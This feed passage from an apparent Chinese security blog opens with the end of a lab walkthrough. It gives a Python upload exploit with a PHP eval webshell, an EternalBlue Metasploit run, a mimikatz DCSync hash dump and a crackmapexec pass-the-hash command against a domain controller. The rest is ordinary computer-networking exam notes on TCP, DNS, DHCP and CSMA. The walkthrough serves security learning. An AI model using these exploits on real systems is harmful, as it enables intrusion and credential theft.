class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br></pre></td></tr></table></figure><p>运行代码的同目录下应该写一个1.php,内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本后获得文件上传路径</p><p>蚁剑配置socks5代理后连接，得到flag2</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/4.png" alt="4"></p><p>这个一般直接拿kali的msf打永恒之蓝</p><p>给kali配置socks5代理</p><p>vim &#x2F;etc&#x2F;proxychains4.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功正向连接</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/5.png" alt="5"></p><p>mimikatz搜集域内用户hash，再用crackmapexec打PTH拿下域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云镜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>2025.6.19 明天就考试了，怎么办怎么办(慌)</p><p>最基础的知识点了</p><p>往年题<a href="https://xyy9233.github.io/2024/12/16/ji-wang/">https://xyy9233.github.io/2024/12/16/ji-wang/</a>  🥰伟大</p><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><p>通常把与因特网相连的计算机或其他设备称为端系统，端系统也称为主机，主机分为客户和服务器</p><p>接入网是指将端系统物理连接到边缘路由器的网络，边缘路由器是端系统到任何其他远程端系统的路径的第一台路由器</p><ul><li>家庭接入</li><li>企业接入</li><li>广域无线接入</li></ul><p>网络核心：位于网络层级的最顶层，连接多个边缘网络</p><h2 id="分组交换与电路交换"><a href="#分组交换与电路交换" class="headerlink" title="分组交换与电路交换"></a>分组交换与电路交换</h2><table><thead><tr><th align="left"><strong>特性</strong></th><th align="left"><strong>分组交换</strong></th><th align="left"><strong>电路交换</strong></th></tr></thead><tbody><tr><td align="left"><strong>连接类型</strong></td><td align="left"><strong>无连接</strong>（如IP网络）或 <strong>逻辑连接</strong>（如TCP）</td><td align="left"><strong>物理连接</strong>（独占端到端链路）</td></tr><tr><td align="left"><strong>建立过程</strong></td><td align="left">无需预先建立固定路径，数据包独立路由（如快递）</td><td align="left">需预先建立专用通道（如传统电话拨号）</td></tr></tbody></table><p>存储转发传输：在交换机开始向输出链路传输该分组的第一个比特之前，必须接受到整个分组。通过N条速率均为R的链路组成的路径，从源到目的地发送一个分组，d_end&#x3D;NL&#x2F;R</p><p>排队时延：分组交换机对每个相联的链路有一个输出缓存，到达的分组在输出缓存中等待，缓存大小有限，如果缓存满了，会发生丢包</p><p>转发表和路由选择协议</p><p>电路交换：在两台主机之间创建一条专用的端到端连接，链路中的电路通过频分复用或时分复用来实现</p><p>分组交换的性能优于电路交换：分组交换按需分配链路</p><p>例题：分组交换和电路交换支持的用户数</p><blockquote><p>某网络提供商有一个总带宽为 <strong>1 Mbps（1000 Kbps）</strong> 的通信链路。每个用户在通信时需要<strong>恒定的 100 Kbps</strong> 带宽。</p><p>问题：</p><ol><li><strong>电路交换</strong>模式下，最多能同时支持多少个用户？</li><li>若采用<strong>分组交换</strong>，假设每个用户以 10% 的概率在任意时刻发送数据，问该链路最多可以支持多少个用户，使得几乎不会出现拥塞？</li></ol><hr><p> 解答解析：</p><ol><li><strong>电路交换</strong></li></ol><ul><li>每个用户通信时占用 100 Kbps，链路总带宽为 1000 Kbps；</li><li>所以最多能支持的并发用户数为：</li></ul><p>1000&#x2F;100&#x3D;10 个用户</p><p>电路交换需要为每个用户<strong>预留带宽</strong>，即使用户暂时不发送数据也占用资源。</p><hr><ol start="2"><li><strong>分组交换</strong></li></ol><ul><li>每个用户在任意时刻有 10% 的概率发送数据；</li><li>假设有 NNN 个用户，则期望同时活跃的用户数为：</li></ul><p>0.1×N</p><ul><li>为了使链路不会拥塞，活跃用户带宽需求应不超过总带宽：</li></ul><p>0.1×N×100≤1000⇒N≤100</p><p>所以，分组交换在这种统计复用场景下，最多可以支持 <strong>约 100 个用户</strong>，是电路交换的 <strong>10 倍</strong>。</p></blockquote><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>处理时延：检查分组首部和决定分组导向何处和其他因素比如检查比特级别的差错，微秒或更低数量级</p><p>排队时延：分组在链路上等待传输</p><p>传输时延：先到先服务方式，L表示该分组的长度，R表示从路由器A到路由器B的传输速率，L&#x2F;R</p><p>传播时延：传播速率取决于物理媒介，传播时延&#x3D;两台路由器的距离除以传播速率，d&#x2F;s</p><p>排队时延和丢包：令a表示分组到达队列的平均速率，则比特到达队列的平均速率为La bps,La&#x2F;R称为流量强度，设计系统时流量强度不能大于1</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>HTTP 服务器采用无状态(stateless)管理方式，不保存客户端的任何状态信息。为了能记录用户状态，需要使用cookies</p><p>Web Cache（网页缓存）的作用是在客户端或中间网络节点保存之前获取过的 Web 资源副本，以减少后续访问相同资源时的响应延迟、带宽消耗和服务器负载。这是 Web 性能优化中非常关键的一环。</p><h2 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h2><p>动态主机配置协议，自动为设备分配 IP 地址及网络参数，它使用UDP传输，属于应用层</p><p>使用端口：UDP 67（服务器端）、UDP 68（客户端）</p><p>工作流程</p><table><thead><tr><th>步骤</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>①</td><td><strong>Discover</strong></td><td>客户端广播发送 DHCP Discover，寻找 DHCP 服务器，源ip为0.0.0.0，目的ip为255.255.255.255</td></tr><tr><td>②</td><td><strong>Offer</strong></td><td>服务器回应 DHCP Offer，提供一个 IP 地址等参数，源ip为dhcp服务器ip,目的ip为255.255.255.255</td></tr><tr><td>③</td><td><strong>Request</strong></td><td>客户端广播发送 DHCP Request，请求使用该 IP 地址，源ip为0.0.0.0，目的ip为255.255.255.255</td></tr><tr><td>④</td><td><strong>ACK</strong></td><td>服务器发送 DHCP ACK，确认配置，租约开始，源ip为dhcp服务器ip,目的ip为255.255.255.255</td></tr></tbody></table><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.png" alt="image-20250617214644098"></p><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>将域名转换为IP地址</p><p><strong>本地 DNS 递归查询过程如下：</strong></p><ol><li>问根服务器（Root DNS）</li></ol><ul><li>问：“.com 域在哪？”</li><li>根服务器返回：你去找 .com 顶级域（TLD）服务器</li></ul><ol start="2"><li>问 .com 顶级域服务器</li></ol><ul><li>问：“example.com 在哪？”</li><li>返回：去找 example.com 的权威 DNS 服务器</li></ul><ol start="3"><li>问权威 DNS 服务器</li></ol><ul><li>问：“<a href="http://www.example.com/">www.example.com</a> 的 IP 是多少？”</li><li>返回最终答案：例如 <code>93.184.216.34</code></li></ul><ol start="4"><li>本地 DNS 把结果返回给客户端</li></ol><ul><li>同时会将查询结果 缓存一段时间（根据 TTL），避免重复查询。</li></ul><ol start="5"><li>浏览器用 IP 发起 HTTP 请求</li></ol><h2 id="SMTP协议（了解）"><a href="#SMTP协议（了解）" class="headerlink" title="SMTP协议（了解）"></a>SMTP协议（了解）</h2><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.png" alt="image-20250617220521682"></p><p>邮件发送协议SMTP，邮件读取协议POP3</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.png" alt="image-20250617220714950"></p><h2 id="服务模型"><a href="#服务模型" class="headerlink" title="服务模型"></a>服务模型</h2><ul><li>CS 客户端-服务器</li><li>P2P 对等</li><li>混合</li></ul><p>CS和P2P比较</p><table><thead><tr><th>对比维度</th><th><strong>CS（Client-Server）</strong></th><th><strong>P2P（Peer-to-Peer）</strong></th></tr></thead><tbody><tr><td><strong>中心节点</strong></td><td>有中心服务器</td><td>无中心，或仅有“协调服务器”</td></tr><tr><td><strong>节点角色</strong></td><td>客户端请求、服务器响应</td><td>节点既是客户端又是服务器</td></tr><tr><td><strong>通信方式</strong></td><td>客户端 ↔ 服务器</td><td>节点 ↔ 节点（点对点）</td></tr><tr><td><strong>可扩展性</strong></td><td>差，服务器是瓶颈</td><td>好，越多人越快（比如 BitTorrent）</td></tr><tr><td><strong>稳定性</strong></td><td>高，服务器在线即可提供服务</td><td>依赖各节点，易受节点下线影响</td></tr><tr><td><strong>资源管理</strong></td><td>集中管理</td><td>分布式管理</td></tr><tr><td><strong>维护成本</strong></td><td>高（需要维护服务器）</td><td>低（资源由用户节点维护）</td></tr><tr><td><strong>常见应用</strong></td><td>网站、银行系统、邮箱、Web 服务等</td><td>BT 下载、电驴、电信 IPTV、区块链、IPFS 等</td></tr></tbody></table><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619215426535.png" alt="image-20250619215426535"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619215452820.png" alt="image-20250619215452820"></p><h2 id="持久性HTTP和非持久性HTTP"><a href="#持久性HTTP和非持久性HTTP" class="headerlink" title="持久性HTTP和非持久性HTTP"></a>持久性HTTP和非持久性HTTP</h2><table><thead><tr><th>特性</th><th>非持久性 HTTP（Non-persistent）</th><th>持久性 HTTP（Persistent）</th></tr></thead><tbody><tr><td><strong>连接方式</strong></td><td>每个请求-响应对使用一个 TCP 连接</td><td>多个请求-响应共享一个 TCP 连接</td></tr><tr><td><strong>TCP 连接次数</strong></td><td>多次建立和关闭连接（开销大）</td><td>建立一次连接后复用（效率高）</td></tr><tr><td><strong>延迟表现</strong></td><td>更高的延迟，慢</td><td>延迟更低，快</td></tr><tr><td><strong>使用情况</strong></td><td>HTTP&#x2F;1.0 默认</td><td>HTTP&#x2F;1.1 默认启用（可禁用）</td></tr></tbody></table><p>$$<br>T_{\text{non-persistent}} &#x3D; n \times (2 \cdot RTT + \frac{F}{R})<br>$$</p><p>$$<br>T_{\text{persistent}} &#x3D; 2 \cdot RTT + n \cdot \frac{F}{R}<br>$$</p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="TCP和UDP的区别"><a href="#TCP和UDP的区别" class="headerlink" title="TCP和UDP的区别"></a>TCP和UDP的区别</h2><table><thead><tr><th>对比项</th><th><strong>TCP</strong></th><th><strong>UDP</strong></th></tr></thead><tbody><tr><td><strong>全称</strong></td><td>Transmission Control Protocol（传输控制协议）</td><td>User Datagram Protocol（用户数据报协议）</td></tr><tr><td><strong>是否面向连接</strong></td><td>✅ 是（需要三次握手建立连接）</td><td>❌ 否（无连接，直接发送）</td></tr><tr><td><strong>可靠性</strong></td><td>✅ 可靠传输，确保无丢包、无重复、按序到达</td><td>❌ 不可靠，可能丢包、不按序、不重传</td></tr><tr><td><strong>传输方式</strong></td><td>字节流（Stream）</td><td>数据报（Datagram）</td></tr><tr><td><strong>拥塞控制</strong></td><td>✅ 有（如 TCP Reno, CUBIC 等）</td><td>❌ 没有</td></tr><tr><td><strong>流量控制</strong></td><td>✅ 有（滑动窗口机制）</td><td>❌ 没有</td></tr><tr><td><strong>首部开销</strong></td><td>较大，20 字节起</td><td>较小，8 字节</td></tr><tr><td><strong>速度</strong></td><td>较慢（有确认、重传等机制）</td><td>快（直接发，不管结果）</td></tr><tr><td><strong>典型应用</strong></td><td>HTTP、HTTPS、FTP、SMTP、SSH 等</td><td>DNS、视频直播、VoIP、在线游戏等</td></tr></tbody></table><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p>checksum校验和</p><p>1.构造伪首部，虽然不在 UDP 报文中，但参与校验和计算</p><p>2.如果总长度不是 16 位的整数倍，补一个 0 字节再计算</p><p>3.按16位分组相加，产生溢出要加到低位</p><p>4.取反码</p><h2 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h2><p>三次握手</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619204108474.png" alt="image-20250619204108474"></p><p>四次挥手</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619204139638.png" alt="image-20250619204139638"></p><h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><p>AIMD自适应指数衰减法</p><p>TCP CUBIC 改进AIMD，丢包后窗口大小减半，最初更快的增长，随后以更慢的速度达到最大窗口值</p><p>![屏幕截图 2025-06-15 150137](屏幕截图 2025-06-15 150137.png)</p><p>TCP reno</p><p>![屏幕截图 2025-06-14 170733](屏幕截图 2025-06-14 170733.png)</p><p>慢启动阶段：初始时cwnd&#x3D;1 MSS,每一个轮次cwnd大小加倍，指数级增长</p><p>拥塞避免阶段：每一个轮次cwnd加1，线性增长</p><p>快重传：</p><ul><li><p>超时：这是严重的拥塞，说明连续多个数据包都没有被确认。</p><p>将拥塞窗口 cwnd 重置为 1 MSS，ssthresh（慢开始门限）设为原 cwnd 的一半，重新进入 慢开始阶段</p></li><li><p>收到三次重复ACK：说明某个包丢了，但之后的包被收到了。</p><p>快速重传丢失的数据包（无需等待超时），ssthresh &#x3D; cwnd &#x2F; 2</p><p>cwnd &#x3D; ssthresh + 3 × MSS（考虑已经收到 3 个冗余 ACK）</p><p>进入快速恢复（Fast Recovery）阶段，在收到新的 ACK 后，恢复到拥塞避免（Congestion Avoidance）阶段</p></li></ul><p>快速恢复：</p><p>每收到一个重复的ACK，cwnd加1</p><p>收到一个新的ACK，将 cwnd 恢复为 ssthresh，退出快速恢复，进入拥塞避免阶段</p><p>newreno：改进了快速恢复算法。在Reno中发送方只要收到一个新的ACK就会进入拥塞避免阶段，在New Reno中只有所有丢失的包都重传并收到确认后才退出</p><p>MTU:数据链路层中一个数据帧最大能承载的字节数，一般为1500bytes</p><p>MSS:TCP协议中一个TCP报文中应用层数据的最大长度，MSS&#x3D;MTU-IP头部-TCP头部&#x3D;1460bytes</p><h2 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h2><p>基于滑动窗口协议，为了匹配发送方的发送速率和接收方的读取速率</p><p>传输层和数据链路层流量控制的区别：传输层定义端到端用户之间的流量控制，数据链路层定义两个相邻节点的流量控制。数据链路层的滑动窗口大小是固定的，而传输层的可以动态变化</p><p>停等协议</p><p>相当于发送窗口大小&#x3D;1，接收窗口大小&#x3D;1</p><p>滑动窗口协议</p><table><thead><tr><th>协议</th><th>特点</th><th>丢包&#x2F;出错时</th><th>适用于</th></tr></thead><tbody><tr><td><strong>GBN（Go-Back-N）</strong></td><td>接收方只接收按序号到达的分组，只发送<strong>累计确认 ACK</strong></td><td>丢一个，后面全部重传</td><td>逻辑简单、吞吐低</td></tr><tr><td><strong>SR（Selective Repeat）</strong></td><td>接收方可接受乱序分组，每个分组独立确认</td><td>只重传出错&#x2F;丢失的那一个</td><td>更复杂、吞吐高</td></tr></tbody></table><p>利用率</p><p>![屏幕截图 2025-06-17 113459](屏幕截图 2025-06-17 113459.png)</p><p>![屏幕截图 2025-06-17 113515](屏幕截图 2025-06-17 113515.png)</p><h2 id="rdt"><a href="#rdt" class="headerlink" title="rdt"></a>rdt</h2><p>可靠数据传输协议，它通常作为一种教学模型出现，用来帮助理解实际网络协议（如 TCP）是如何解决数据丢失、重复、乱序等问题的。</p><h3 id="rdt1-0"><a href="#rdt1-0" class="headerlink" title="rdt1.0"></a>rdt1.0</h3><p>可靠信道，无差错，不丢包，最简单</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.png" alt="4"></p><h3 id="rdt2-0"><a href="#rdt2-0" class="headerlink" title="rdt2.0"></a>rdt2.0</h3><p>信道可能出错，使用 确认ACK &#x2F; 负确认NAK + 校验位</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.png" alt="image-20250619161214580"></p><h3 id="rdt2-1"><a href="#rdt2-1" class="headerlink" title="rdt2.1"></a>rdt2.1</h3><p>增加了 序号来防止 ACK &#x2F; NAK 混淆</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161445314.png" alt="image-20250619161445314"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161546120.png" alt="image-20250619161546120"></p><h3 id="rdt2-2"><a href="#rdt2-2" class="headerlink" title="rdt2.2"></a>rdt2.2</h3><p>使用 ACK + 序号（无 NAK）</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161651943.png" alt="image-20250619161651943"></p><h3 id="rdt3-0"><a href="#rdt3-0" class="headerlink" title="rdt3.0"></a>rdt3.0</h3><p>处理信道可能丢包的问题，增加超时重传机制，相当于停等协议</p><p>sender:</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161841028.png" alt="image-20250619161841028"></p><h2 id="TCP的往返时延超时机制"><a href="#TCP的往返时延超时机制" class="headerlink" title="TCP的往返时延超时机制"></a>TCP的往返时延超时机制</h2><p>EstimatedRTT &#x3D; (1 - α) * EstimatedRTT + α * SampleRTT</p><p>这是一个加权平均公式，用于估计 RTT（即从一个数据包发送到收到确认的时间）</p><p>指数加权平均移动，α典型值为0.125</p><p>优点：</p><p>对最近的样本更敏感，响应网络变化；</p><p>对过去的样本仍保留一定影响，从而避免波动太大；</p><p>可以平滑 RTT 的估计值，提高 TCP 超时机制的稳定性。</p><p>DevRTT 表示 RTT 的平均偏差，是对 RTT 波动情况的一种估计。若网络中 RTT 波动很大，DevRTT 也会较大；反之，如果 SampleRTT 很稳定，DevRTT 就会较小。</p><p>DevRTT&#x3D;(1−β)⋅DevRTT+β⋅∣SampleRTT−EstimatedRTT∣</p><p>β典型值为0.25</p><p> TCP 的超时重传时间TimeoutInterval&#x3D;EstimatedRTT+4⋅DevRTT</p><p>这是为了应对 RTT 的波动——容忍范围扩大 4 倍，以减少不必要的重传。</p><p>若 RTT 非常不稳定，DevRTT 会变大，TimeoutInterval 就会自动增加；</p><p>若 RTT 非常平稳，TimeoutInterval 会相应减小，提高效率。</p><h2 id="TCP-fairness"><a href="#TCP-fairness" class="headerlink" title="TCP fairness"></a>TCP fairness</h2><p>当多个 TCP 流共享同一瓶颈链路时，每个流都能获得大致相同的吞吐量，不会有某个流“独占”资源而饿死其他流。</p><p>为什么会有fairness?</p><p>因为 TCP 的拥塞控制机制天然具有“自适应”行为，它能根据网络反馈（如丢包）来控制自己的发送速率。</p><p>这让多个 TCP 连接在共享链路时，相互协调、退让，从而实现公平。</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619203838656.png" alt="image-20250619203838656"></p><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务</p><p>路由器的两个功能：路由和转发</p><p>数据平面和控制平面，转发是数据平面的功能，路由选择是控制平面的功能</p><h2 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h2><p>一种网络架构，集中式的控制平面和分布式的数据平面，两个平面相互分离。</p><p>远程主机为每个分组计算出最佳路由，通过openflow协议将转发表（流表）下发给路由器</p><p>网络发生了拥塞的根据是随着通信子网负载的增加，吞吐量反而降低</p><p>存储转发机制：路由器在开始向输出链路传输第一个分组之前，必须接受到整个分组</p><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息，ping命令</p><h2 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h2><p>静态路由：管理员手工配置</p><p>动态路由：</p><ul><li>距离-向量路由算法：所有结点定期将它们的路由表转发给所有相邻的结点，然后更新路由表，RIP算法</li><li>链路状态路由算法：向本自治系统的所有路由器发送信息，使用泛洪法，发送的信息是与路由器相邻的所有路由器的链路状态，只有当链路状态发生变化时路由器才发送消息，OSPF算法</li></ul><p>层次路由：对于大规模的网络，因特网将整个互联网分为许多较小的自治系统，自治系统内部决定用哪种路由协议</p><p>内部网关协议(IGP):RIP,OSPF</p><p>外部网关协议(EGP):BGP</p><h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p>快学</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT 是一种由路由器实施的技术，用于将私有 IP 地址（内网地址）转换为公有 IP 地址（公网地址），从而实现内网主机访问互联网或外网访问内网服务。</p><p>工作方式：</p><p>以 <strong>内网主机访问外网</strong> 为例（最常见）：</p><ol><li>内网主机发送请求（如访问 <a href="http://www.baidu.com),源/">www.baidu.com），源</a> IP 是私有 IP（如 192.168.1.100）；</li><li>路由器收到后，使用 NAT 把源 IP 转换为自己的公网 IP（如 101.1.2.3），并记录转换关系；</li><li>数据包发送到公网；</li><li>响应返回时，路由器根据记录，将目标 IP（公网 IP）重新转换为 192.168.1.100，转发给内网主机。</li></ol><h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><p>帧定界帧同步和透明传输</p><p>流量控制(传输层也有)</p><p>差错控制：</p><ul><li>检错码：奇偶校验码，CRC循环冗余校验码</li><li>纠错码：海明码（好复杂）</li></ul><h2 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h2><p>信道划分介质访问控制：</p><ul><li>频分</li><li>时分</li><li>波分</li><li>码分</li></ul><p>随机访问介质访问控制：</p><ul><li>ALOHA协议</li><li>CSMA</li><li>CSMA&#x2F;CD(有线局域网) 支持半双工方式</li><li>CSMA&#x2F;CA(无线局域网)</li></ul><p>ALOHA：<a href="https://blog.csdn.net/shulianghan/article/details/108095501">https://blog.csdn.net/shulianghan/article/details/108095501</a><br>CSMA：</p><ol><li><strong>监听信道（Carrier Sense）</strong>：<ul><li>发送方在发送数据前先监听信道是否正在被占用。</li></ul></li><li><strong>信道空闲（Idle）</strong>：<ul><li>若信道空闲，立即开始发送数据。</li></ul></li><li><strong>信道繁忙（Busy）</strong>：<ul><li>若信道被占用，则等待一段时间后重新监听。</li></ul></li><li><strong>可能冲突（Collision）</strong>：<ul><li>由于传播延迟等原因，两个节点可能会“几乎同时”判断信道空闲并发送，导致冲突。</li></ul></li><li><strong>冲突检测&#x2F;避免（取决于具体变体）</strong></li></ol><table><thead><tr><th>协议名</th><th>中文名</th><th>说明</th></tr></thead><tbody><tr><td><strong>1. 纯 CSMA</strong></td><td>无碰撞检测或避免机制</td><td>听到空闲就发，不考虑冲突。</td></tr><tr><td><strong>2. 1-坚持 CSMA</strong></td><td>1-persistent CSMA</td><td>如果信道空闲立即发送，若忙就持续监听直到空闲立即发送（易冲突）。</td></tr><tr><td><strong>3. 非坚持 CSMA</strong></td><td>Non-persistent CSMA</td><td>如果信道忙，等待随机时间再监听（降低冲突概率，但效率低）。</td></tr><tr><td><strong>4. p-坚持 CSMA</strong></td><td>p-persistent CSMA（用于时隙系统）</td><td>若空闲以概率 p 发送，否则延迟一个时隙再尝试。</td></tr><tr><td><strong>5. CSMA&#x2F;CD</strong></td><td>冲突检测（Ethernet）</td><td>发送时监听是否有冲突，若有冲突立即停止发送（不能用于无线）。</td></tr><tr><td><strong>6. CSMA&#x2F;CA</strong></td><td>冲突避免（Wi-Fi）</td><td>在发送前先等待一段时间（DIFS），再进行竞争避免（不能检测冲突）。</td></tr></tbody></table><p>![屏幕截图 2025-06-19 115659](屏幕截图 2025-06-19 115659.png)</p><p>隐蔽站问题：</p><p>A 和 C 都能和 B 通信，但 A 和 C 互相“听不到”（不在彼此的无线信号覆盖范围）</p><p>用RTS和CTS解决隐蔽站问题</p><p>A 想发送数据给 B，先发送一个 RTS（请求发送）帧；</p><p>B 收到 RTS 后，若信道空闲，就返回一个 CTS（允许发送）帧；</p><p>所有能听到 CTS 的节点（比如 C）会知道 B 将接收数据，于是保持沉默（不发数据）；</p><p>A 收到 CTS 后再正式发送数据；</p><p>完成后 B 回复 ACK 确认。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，ip地址映射到MAC地址，每台主机都有ARP表</p><p>ARP的工作原理：</p><p><strong>主机 A 检查自己的 ARP 缓存表</strong>：</p><ul><li>看有没有 192.168.1.2 对应的 MAC 地址。</li><li>如果有，直接使用；</li><li>如果没有，继续下一步。</li></ul><p><strong>主机 A 发起 ARP 请求广播</strong>：</p><ul><li>目标 IP：192.168.1.2</li><li>ARP 请求数据包封装在以太网帧中，目的 MAC 地址是广播地址 <code>FF:FF:FF:FF:FF:FF</code></li><li>各局域网设备都能收到。</li></ul><p><strong>主机 B 收到 ARP 请求，发现目标 